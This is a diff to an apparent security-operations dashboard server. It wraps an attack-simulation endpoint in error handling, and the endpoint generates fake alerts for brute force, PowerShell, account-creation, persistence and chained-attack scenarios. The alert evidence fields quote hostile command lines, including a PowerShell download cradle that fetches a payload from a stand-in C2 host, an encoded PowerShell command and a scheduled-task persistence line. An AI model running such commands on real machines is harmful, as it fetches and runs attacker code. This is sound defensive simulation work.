@@ -373,164 +373,169 @@ async function startServer() {
 
   // Simulation Endpoint for the 5 MVP scenarios
   app.post('/api/simulate/:scenario', (req, res) => {
-    const { scenario } = req.params;
-    let generatedAlerts: Alert[] = [];
-    let targetHost = 'WIN-EP01';
+    try {
+      const { scenario } = req.params;
+      let generatedAlerts: Alert[] = [];
+      let targetHost = 'WIN-EP01';
 
-    if (scenario === 'brute-force') {
-      targetHost = 'WIN-EP01';
-      generatedAlerts = [
-        {
-          alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
-          timestamp: new Date().toISOString(),
-          rule_id: 'RULE-BF-02',
-          rule_name: 'High-Volume Brute Force Attack via Hydra',
-          severity: 'High',
-          risk_score: 78,
-          source_host: targetHost,
-          source_ip: '192.168.1.140',
-          target_account: 'administrator',
-          mitre_technique: 'T1110',
-          mitre_tactic: 'Credential Access',
-          evidence_raw: 'Windows Event ID 4625: 42 consecutive failed logon attempts for Administrator from external subnet 192.168.1.140 via RDP (Port 3389).',
-          status: 'Unassigned'
-        }
-      ];
-    } else if (scenario === 'powershell') {
-      targetHost = 'WIN-EP01';
-      generatedAlerts = [
-        {
-          alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
-          timestamp: new Date().toISOString(),
-          rule_id: 'RULE-PS-02',
-          rule_name: 'Obfuscated PowerShell Download Cradle Execution',
-          severity: 'High',
-          risk_score: 85,
-          source_host: targetHost,
-          source_ip: '192.168.1.105',
-          target_account: 'admin_test',
-          mitre_technique: 'T1059.001',
-          mitre_tactic: 'Execution',
-          evidence_raw: 'Sysmon Event ID 1: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1 -OutFile c:\\temp\\update.ps1"',
-          status: 'Unassigned'
-        }
-      ];
-    } else if (scenario === 'account-creation') {
-      targetHost = 'DC-01';
-      generatedAlerts = [
-        {
-          alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
-          timestamp: new Date().toISOString(),
-          rule_id: 'RULE-ACC-01',
-          rule_name: 'Unauthorized Domain User Account Creation',
-          severity: 'Critical',
-          risk_score: 90,
-          source_host: targetHost,
-          source_ip: '192.168.1.10',
-          target_account: 'test_admin',
-          mitre_technique: 'T1098',
-          mitre_tactic: 'Persistence',
-          evidence_raw: 'Windows Event ID 4720: A user account was created. TargetAccount: test_admin CreatorSubject: WIN-EP01$ Privilege: Domain Admin group added.',
-          status: 'Unassigned'
-        }
-      ];
-    } else if (scenario === 'persistence') {
-      targetHost = 'WIN-EP01';
-      generatedAlerts = [
-        {
-          alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
-          timestamp: new Date().toISOString(),
-          rule_id: 'RULE-TSK-02',
-          rule_name: 'Malicious Scheduled Task Persistence Created',
-          severity: 'High',
-          risk_score: 82,
-          source_host: targetHost,
-          source_ip: '192.168.1.105',
-          target_account: 'SYSTEM',
-          mitre_technique: 'T1053.005',
-          mitre_tactic: 'Persistence',
-          evidence_raw: 'Windows Event ID 4698: Task Scheduler created task Name: "UpdaterService" Action: cmd.exe /c schtasks /run /tn UpdaterService',
-          status: 'Unassigned'
-        }
-      ];
-    } else if (scenario === 'chain-attack') {
-      // 1 -> 2 -> 4 sequence in 1 minute
-      targetHost = 'WIN-EP01';
-      const now = Date.now();
-      generatedAlerts = [
-        {
-          alert_id: `ALT-${Math.floor(5000 + Math.random() * 1000)}`,
-          timestamp: new Date(now - 30000).toISOString(),
-          rule_id: 'RULE-BF-CH1',
-          rule_name: 'Initial Credential Brute Force Stage 1',
-          severity: 'High',
-          risk_score: 75,
-          source_host: 'WIN-EP01',
-          source_ip: '192.168.1.199',
-          target_account: 'sys_admin',
-          mitre_technique: 'T1110',
-          mitre_tactic: 'Credential Access',
-          evidence_raw: 'Event ID 4625: 50 failed logons detected on WIN-EP01.',
-          status: 'Investigating'
-        },
-        {
-          alert_id: `ALT-${Math.floor(6000 + Math.random() * 1000)}`,
-          timestamp: new Date(now - 15000).toISOString(),
-          rule_id: 'RULE-PS-CH2',
-          rule_name: 'Execution of Encoded Payload Stage 2',
-          severity: 'Critical',
-          risk_score: 88,
-          source_host: 'WIN-EP01',
-          source_ip: '192.168.1.105',
-          target_account: 'sys_admin',
-          mitre_technique: 'T1059.001',
-          mitre_tactic: 'Execution',
-          evidence_raw: 'Sysmon Event ID 1: powershell.exe -enc SW52b2tlLVBvd2VyU2hlbGxXZWI...',
-          status: 'Investigating'
-        },
-        {
-          alert_id: `ALT-${Math.floor(7000 + Math.random() * 1000)}`,
-          timestamp: new Date(now).toISOString(),
-          rule_id: 'RULE-TSK-CH3',
-          rule_name: 'Persistence Scheduled Task Stage 3',
-          severity: 'Critical',
-          risk_score: 95,
-          source_host: 'WIN-EP01',
-          source_ip: '192.168.1.105',
-          target_account: 'SYSTEM',
-          mitre_technique: 'T1053.005',
-          mitre_tactic: 'Persistence',
-          evidence_raw: 'Event ID 4698: Task created for persistence execution.',
-          status: 'Investigating'
-        }
-      ];
-    } else {
-      return res.status(400).json({ error: 'Invalid scenario type' });
+      if (scenario === 'brute-force') {
+        targetHost = 'WIN-EP01';
+        generatedAlerts = [
+          {
+            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
+            timestamp: new Date().toISOString(),
+            rule_id: 'RULE-BF-02',
+            rule_name: 'High-Volume Brute Force Attack via Hydra',
+            severity: 'High',
+            risk_score: 78,
+            source_host: targetHost,
+            source_ip: '192.168.1.140',
+            target_account: 'administrator',
+            mitre_technique: 'T1110',
+            mitre_tactic: 'Credential Access',
+            evidence_raw: 'Windows Event ID 4625: 42 consecutive failed logon attempts for Administrator from external subnet 192.168.1.140 via RDP (Port 3389).',
+            status: 'Unassigned'
+          }
+        ];
+      } else if (scenario === 'powershell') {
+        targetHost = 'WIN-EP01';
+        generatedAlerts = [
+          {
+            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
+            timestamp: new Date().toISOString(),
+            rule_id: 'RULE-PS-02',
+            rule_name: 'Obfuscated PowerShell Download Cradle Execution',
+            severity: 'High',
+            risk_score: 85,
+            source_host: targetHost,
+            source_ip: '192.168.1.105',
+            target_account: 'admin_test',
+            mitre_technique: 'T1059.001',
+            mitre_tactic: 'Execution',
+            evidence_raw: 'Sysmon Event ID 1: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1 -OutFile c:\\temp\\update.ps1"',
+            status: 'Unassigned'
+          }
+        ];
+      } else if (scenario === 'account-creation') {
+        targetHost = 'DC-01';
+        generatedAlerts = [
+          {
+            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
+            timestamp: new Date().toISOString(),
+            rule_id: 'RULE-ACC-01',
+            rule_name: 'Unauthorized Domain User Account Creation',
+            severity: 'Critical',
+            risk_score: 90,
+            source_host: targetHost,
+            source_ip: '192.168.1.10',
+            target_account: 'test_admin',
+            mitre_technique: 'T1098',
+            mitre_tactic: 'Persistence',
+            evidence_raw: 'Windows Event ID 4720: A user account was created. TargetAccount: test_admin CreatorSubject: WIN-EP01$ Privilege: Domain Admin group added.',
+            status: 'Unassigned'
+          }
+        ];
+      } else if (scenario === 'persistence') {
+        targetHost = 'WIN-EP01';
+        generatedAlerts = [
+          {
+            alert_id: `ALT-${Math.floor(4000 + Math.random() * 5000)}`,
+            timestamp: new Date().toISOString(),
+            rule_id: 'RULE-TSK-02',
+            rule_name: 'Malicious Scheduled Task Persistence Created',
+            severity: 'High',
+            risk_score: 82,
+            source_host: targetHost,
+            source_ip: '192.168.1.105',
+            target_account: 'SYSTEM',
+            mitre_technique: 'T1053.005',
+            mitre_tactic: 'Persistence',
+            evidence_raw: 'Windows Event ID 4698: Task Scheduler created task Name: "UpdaterService" Action: cmd.exe /c schtasks /run /tn UpdaterService',
+            status: 'Unassigned'
+          }
+        ];
+      } else if (scenario === 'chain-attack') {
+        // 1 -> 2 -> 4 sequence in 1 minute
+        targetHost = 'WIN-EP01';
+        const now = Date.now();
+        generatedAlerts = [
+          {
+            alert_id: `ALT-${Math.floor(5000 + Math.random() * 1000)}`,
+            timestamp: new Date(now - 30000).toISOString(),
+            rule_id: 'RULE-BF-CH1',
+            rule_name: 'Initial Credential Brute Force Stage 1',
+            severity: 'High',
+            risk_score: 75,
+            source_host: 'WIN-EP01',
+            source_ip: '192.168.1.199',
+            target_account: 'sys_admin',
+            mitre_technique: 'T1110',
+            mitre_tactic: 'Credential Access',
+            evidence_raw: 'Event ID 4625: 50 failed logons detected on WIN-EP01.',
+            status: 'Investigating'
+          },
+          {
+            alert_id: `ALT-${Math.floor(6000 + Math.random() * 1000)}`,
+            timestamp: new Date(now - 15000).toISOString(),
+            rule_id: 'RULE-PS-CH2',
+            rule_name: 'Execution of Encoded Payload Stage 2',
+            severity: 'Critical',
+            risk_score: 88,
+            source_host: 'WIN-EP01',
+            source_ip: '192.168.1.105',
+            target_account: 'sys_admin',
+            mitre_technique: 'T1059.001',
+            mitre_tactic: 'Execution',
+            evidence_raw: 'Sysmon Event ID 1: powershell.exe -enc SW52b2tlLVBvd2VyU2hlbGxXZWI...',
+            status: 'Investigating'
+          },
+          {
+            alert_id: `ALT-${Math.floor(7000 + Math.random() * 1000)}`,
+            timestamp: new Date(now).toISOString(),
+            rule_id: 'RULE-TSK-CH3',
+            rule_name: 'Persistence Scheduled Task Stage 3',
+            severity: 'Critical',
+            risk_score: 95,
+            source_host: 'WIN-EP01',
+            source_ip: '192.168.1.105',
+            target_account: 'SYSTEM',
+            mitre_technique: 'T1053.005',
+            mitre_tactic: 'Persistence',
+            evidence_raw: 'Event ID 4698: Task created for persistence execution.',
+            status: 'Investigating'
+          }
+        ];
+      } else {
+        return res.status(400).json({ success: false, error: 'Invalid scenario type' });
+      }
+
+      generatedAlerts.forEach(a => alerts.unshift(a));
+      runCorrelationEngine();
+
+      const hostObj = hosts.find(h => h.name === targetHost);
+      if (hostObj && (scenario === 'chain-attack' || scenario === 'powershell')) {
+        hostObj.status = 'compromised';
+      }
+
+      auditLogs.unshift({
+        id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
+        timestamp: new Date().toISOString(),
+        analyst_id: 'SIMULATION_ENGINE',
+        action_taken: `Executed Attack Simulation: ${scenario.toUpperCase()}`,
+        target: targetHost,
+        status: 'Success'
+      });
+
+      res.json({
+        success: true,
+        scenario,
+        alertsInjected: generatedAlerts.length,
+        message: `Successfully executed simulation scenario '${scenario}'. Alerts ingested and correlation engine evaluated.`
+      });
+    } catch (err: any) {
+      console.error('Simulation Error:', err);
+      res.status(500).json({ success: false, error: err.message || 'Simulation execution failed.' });
     }
-
-    generatedAlerts.forEach(a => alerts.unshift(a));
-    runCorrelationEngine();
-
-    const hostObj = hosts.find(h => h.name === targetHost);
-    if (hostObj && (scenario === 'chain-attack' || scenario === 'powershell')) {
-      hostObj.status = 'compromised';
-    }
-
-    auditLogs.unshift({
-      id: `AUD-${Math.floor(1000 + Math.random() * 9000)}`,
-      timestamp: new Date().toISOString(),
-      analyst_id: 'SIMULATION_ENGINE',
-      action_taken: `Executed Attack Simulation: ${scenario.toUpperCase()}`,
-      target: targetHost,
-      status: 'Success'
-    });
-
-    res.json({
-      success: true,
-      scenario,
-      alertsInjected: generatedAlerts.length,
-      message: `Successfully executed simulation scenario '${scenario}'. Alerts ingested and correlation engine evaluated.`
-    });
   });
 
   // AI Triage endpoint using Gemini
